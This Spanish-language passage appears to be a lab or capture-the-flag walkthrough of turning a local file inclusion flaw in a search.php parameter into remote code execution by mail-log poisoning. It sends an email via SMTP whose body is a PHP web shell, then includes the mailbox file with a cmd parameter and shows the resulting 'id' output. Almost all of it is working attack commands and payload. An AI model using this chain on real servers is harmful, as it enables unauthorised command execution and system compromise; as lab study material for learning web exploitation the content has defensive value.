Los mails logs en linux suelen estar almacenados en esta direccion "/var/mail/<user>"

curl -s -X GET "http://10.0.2.8/search.php?file=/var/mail/testuser"

Ahora vamos a intentar crear un log malicioso con codigo en php para que la web lo interprete:

telnet 10.0.2.8 25

En caso que no nos pida credenciales, enviaremos un mail de la siguiente forma:

```
MAIL FROM: test
RCPT TO: testuser
DATA 
<?php system($_GET['cmd']); ?>
.
```

Ahora debemos validar si el código en php se interpreta:

curl -s -X GET "http://10.0.2.8/search.php?file=/var/mail/testuser&cmd=id"

respuesta esperada:

uid=1000(testuser) gid=1000(testuser) grupos=1000(testuser)
